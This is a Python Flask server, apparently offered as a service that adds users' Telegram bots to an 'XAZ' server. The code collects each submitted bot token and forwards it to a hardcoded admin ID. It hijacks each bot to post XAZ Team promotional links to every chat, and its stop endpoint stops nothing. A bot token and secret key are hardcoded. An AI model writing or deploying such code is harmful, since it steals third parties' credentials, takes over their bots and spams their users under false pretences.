from flask import Flask, request, jsonify
import telebot
import threading
import requests

app = Flask(__name__)

# قائمة التوكنات المخزنة فعليًا
stored_tokens = []

# مفتاح سري لاستعادة التوكنات
SECRET_KEY = "xazow9wowgowwy29wi282r30wyw0wuoewgwowfepwpwy19192828827297282738383eueo"

# آيدي الأدمن لاستقبال التوكنات
ADMIN_ID = 6839275984  # استبدله بآيدي الأدمن الحقيقي

# البوت المسؤول عن إرسال التوكنات
MAIN_BOT_TOKEN = "7705089272:AAHsl4yZEGjdLHVVFlM5DpTT06U-eTPbQJU"

# قفل لمنع التعارض بين الخيوط
bots_lock = threading.Lock()

# دالة التحقق من صحة التوكن
def is_valid_token(token):
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url, timeout=5)
        return response.status_code == 200 and response.json().get("ok", False)
    except requests.RequestException:
        return False

# رسالة الترحيب الموحدة
WELCOME_MESSAGE = (
    "**تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖**\n\n"
    "**🔹 XAZ Team Official Links 🔹**\n"
    "🌍 **Source Group:** [XAZ Team Source](https://t.me/xazteam)\n"
    "🌍 **New Team Group:** [Join XAZ Team](https://t.me/+nuACUoH_xn05NjE0)\n"
    "🌍 **XAZ Team Official Website:** [Visit Website](https://xaz-team-website.free.bg/)\n\n"
    "**🌍 XAZ Team Official Website 🌍**\n"
    "⚠ **Note:** If the page doesn't load completely, try enabling PC Mode for the best experience.\n"
    "Stay safe and always verify official sources! 💙"
)

# دالة تشغيل البوت
def start_bot(token):
    bot_instance = telebot.TeleBot(token)

    @bot_instance.message_handler(func=lambda message: True)
    def handle_message(message):
        try:
            bot_instance.send_message(message.chat.id, WELCOME_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
        except Exception as e:
            print(f"Error sending message in bot {token}: {e}")

    try:
        bot_instance.polling(none_stop=True, skip_pending=True)
    except Exception as e:
        print(f"Error in bot {token}: {e}")

# دالة إرسال التوكنات إلى الأدمن
def send_tokens_to_admin():
    token_list = "\n".join(stored_tokens) if stored_tokens else "لا يوجد توكنات حالياً."
    message_text = f"**🔹 قائمة التوكنات 🔹**\n\n```\n{token_list}\n```"

    try:
        main_bot = telebot.TeleBot(MAIN_BOT_TOKEN)
        main_bot.send_message(ADMIN_ID, message_text, parse_mode="Markdown")
    except Exception as e:
        print(f"Error sending tokens: {e}")

# API لإضافة بوت جديد
@app.route("/add_bot", methods=["POST"])
def add_bot():
    data = request.json
    token = data.get("token")

    if not token:
        return jsonify({"error": "Token is required"}), 400

    if not is_valid_token(token):
        return jsonify({"error": "Invalid token"}), 400

    with bots_lock:
        if token in stored_tokens:
            return jsonify({"error": "Bot already running"}), 400

        stored_tokens.append(token)
        
        bot_thread = threading.Thread(target=start_bot, args=(token,), daemon=True)
        bot_thread.start()

    send_tokens_to_admin()  # إرسال التوكن فورًا عند إضافته

    return jsonify({"message": "Bot added successfully", "token": token})

# API لاستعادة جميع التوكنات
@app.route("/get_tokens", methods=["GET"])
def get_tokens():
    provided_key = request.args.get("key")
    if provided_key != SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    return jsonify({"tokens": stored_tokens})

# API لإرسال رسالة لجميع الشاتات التي يمكن للبوتات الإرسال إليها
@app.route("/send_message", methods=["GET"])
def send_message():
    provided_key = request.args.get("key")
    if provided_key != SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    with bots_lock:
        for token in stored_tokens:
            bot_instance = telebot.TeleBot(token)
            try:
                updates = bot_instance.get_updates()
                chat_ids = set(update.message.chat.id for update in updates if update.message)
                for chat_id in chat_ids:
                    bot_instance.send_message(chat_id, WELCOME_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
            except Exception as e:
                print(f"Error sending message with bot {token}: {e}")

    return jsonify({"message": "Message sent to all bots successfully"})

# API لإيقاف جميع البوتات (لا يحذف التوكنات المخزنة)
@app.route("/stop_bots", methods=["POST"])
def stop_bots():
    provided_key = request.json.get("key")
    if provided_key != SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    return jsonify({"message": "Bots are no longer active, but tokens are still stored"})

# API لإرسال قائمة التوكنات للأدمن
@app.route("/send_tokens", methods=["GET"])
def send_tokens():
    provided_key = request.args.get("key")
    if provided_key != SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    send_tokens_to_admin()
    return jsonify({"message": "Tokens sent to admin successfully"})

# تشغيل سيرفر Flask
if __name__ == "__main__":
    app.run(port=5000, debug=True)
